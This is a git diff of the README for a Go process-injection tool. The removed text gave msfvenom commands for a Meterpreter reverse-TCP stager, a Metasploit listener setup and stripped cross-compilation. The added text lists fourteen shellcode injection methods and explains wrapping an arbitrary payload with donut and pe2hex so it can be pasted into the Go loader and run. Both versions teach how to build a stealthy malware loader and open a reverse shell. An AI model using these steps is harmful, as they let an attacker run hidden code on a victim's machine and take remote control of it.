@@ -1,58 +1,43 @@
-# go-inject
+<h5>Credit <a href="https://github.com/zaneGittins/go-inject">zaneGittins</a> & <a href="https://github.com/Ne0nd0g/go-shellcode/tree/master/cmd"> Ne0nd0g </a></h5>
+This tool is created after combining online go injectors and some custom code.<hr>
 
-Process injection techniques written in Go. I've also expanded this repo to include some general offense techniques in Go.
+<h4>Injection can be performed in following</h4>
+<ol>
+  <li>CreateFiber </li>
+  <li>CreateProcess </li>
+  <li>CreateProcessWithPipe </li>
+  <li>CreateRemoteThread </li>
+  <li>CreateRemoteThreadNative </li>
+  <li>CreateThread </li>
+  <li>CreateThreadNative </li>
+  <li>EarlyBird </li>
+  <li>EnumerateLoadedModules </li>
+  <li>EtwpCreateEtwThread </li>
+  <li>NtQueueApcThreadEx-Local </li>
+  <li>RtlCreateUserThread </li>
+  <li>Syscall </li>
+  <li>UuidFromString </li>
+  </ol>
+ <hr>
+<h4>Stuff Needed</h4>
+<ol>
+  <li>An independent HEX Code. </li>
+  <li>GO-LANG Installed in System. </li>
+  <li>Some basic Go-Lang knowlodge</li>
+  <li>Packeges of this repo installed // go get ....</li>
+  </ol>
+  <hr>
+  <h3>Usage</h3>
+<ol>
+  <li>At first put donut.exe(<a href="https://github.com/Jhangju/portable-executable-2-hex-code/blob/main/donut.exe">donut.exe</a>), pe2hex.exe(<a href="https://github.com/Jhangju/portable-executable-2-hex-code/blob/main/pe2hex/pe2hex/bin/Debug/pe2hex.exe">pe2hex.exe</a>) and your payload in same folder. </li>
+  <li>Start donut.exe -f {{your_payload}} // It will create independet payload.bin binary.</li>
+  <li>Start pe2hex.exe -h {{payload.bin}} //It will create an independent hex.txt which is hex code.</li>
+  <li>Use this HEX code in go lang file update already existing hex code.</li>
+  <li>Run the file. Using Go run {file.go}</li>
+  </ol>
 
-## Examples
-
-Process Injection
-
-* [Classic virtual alloc](examples/x64/valloc/valloc.go)
-* [Heap](examples/x64/heap/heap.go)
-* [Remote Thread Injection](examples/x64/remote-thread/remote_thread.go)
-* [APC Queue Code Injection](examples/x64/queue-user-apc/queue.go)
-* [UUID Injection - Used by Lazarus 2021](examples/x64/uuid/uuid.go)
-
-Other offensive techniques:
-
-* [Hook detection](examples/x64/detect-hooks/detect-hooks.go)
-* [Keylogger](examples/x64/keylog/keylog.go)
-* [Hollow](examples/x64/hollow/hollow.go)
-* [API Hashing](examples/x64/api_hash/api_hash.go)
-
-## Usage
-
-Use msfvenom to generate shellcode:
-```bash
-# Option 1: Testing with calculator.
-msfvenom -p windows/x64/exec CMD=calc.exe -f hex
-
-# Option 2: Reverse tcp stager.
-msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
-
-# Option 3: Stageless payload - stealthier.
-msfvenom -p windows/x64/meterpreter_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
-```
-
-Place payload string from above command within one of the example .go files replacing the content of the `payload` variable. If using uuid example, use [shellcode-to-uuids](helpers/shellcode-to-uuids.go) to convert to payload.
-
-Start listener:
-
-```bash
-use payload/windows/x64/meterpreter/reverse_tcp
-set LHOST 127.0.0.1
-set LPORT 4444
-to_handler
-```
-
-## Build Examples
-
-Linux:
-```bash
-env GOOS=windows go build -ldflags="-s -w" -trimpath examples/x64/uuid/uuid.go
-```
 
 ## References
-
 * https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/
 * https://github.com/Adepts-Of-0xCC/VBA-macro-experiments/blob/main/EDRHookDetector.vba
 * https://github.com/brimstone/go-shellcode
